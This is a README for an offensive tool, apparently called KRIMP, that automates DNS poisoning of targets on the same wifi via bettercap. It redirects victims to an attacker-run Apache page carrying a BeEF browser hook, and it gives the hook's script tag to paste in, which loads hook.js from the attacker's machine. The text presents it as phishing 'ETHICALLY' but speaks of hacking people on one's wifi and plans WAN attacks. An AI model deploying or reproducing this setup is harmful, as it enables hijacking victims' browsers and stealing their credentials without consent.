# KRIMP
```
                   ▄█   ▄█▄    ▄████████  ▄█    ▄▄▄▄███▄▄▄▄      ▄███████▄ 
                   ███ ▄███▀   ███    ███ ███  ▄██▀▀▀███▀▀▀██▄   ███    ███ 
                   ███▐██▀     ███    ███ ███▌ ███   ███   ███   ███    ███ 
                  ▄█████▀     ▄███▄▄▄▄██▀ ███▌ ███   ███   ███   ███    ███ 
                 ▀▀█████▄    ▀▀███▀▀▀▀▀   ███▌ ███   ███   ███ ▀█████████▀  
                   ███▐██▄   ▀███████████ ███  ███   ███   ███   ███        
                   ███ ▀███▄   ███    ███ ███  ███   ███   ███   ███        
                   ███   ▀█▀   ███    ███ █▀    ▀█   ███   █▀   ▄████▀      
                   ▀           ███    ███                                   
  ```
  
Do you ever want to phish someone (ETHICALLY) and u cant seem to find a good url? Well I got you covered. 

This tool automates the process of DNS poisoning a target on your wifi, by doing this you can make a custom URL and redirecting your IP, which is hosting apache, to this URL. Once the target is on this page, you will have full access to their browser because of the beEF hook.  

**This tool is in its alpha stage, more automation will come**

## Pre-requisites
1. You will need to have beEf installed
2. You will need to have bettercap installed
3. You will need to have gnome-terminal installed
4. You will need to have apache2 installed

You will also need an index.html file inside of your /var/www/html folder with a beef hook, add this to a html file to hook it with beef:

`<script src="http://<local ip>:3000/hook.js"></script>`

## Configurate the script
- Change the directories in the script to your installation of beEF and bettercap.

### Extra
At the moment, this tool is only used to hack people on your own wifi, more features will come over time, like over WAN.

#### Responsibility
I am not responsible for any actions u take with this tool.

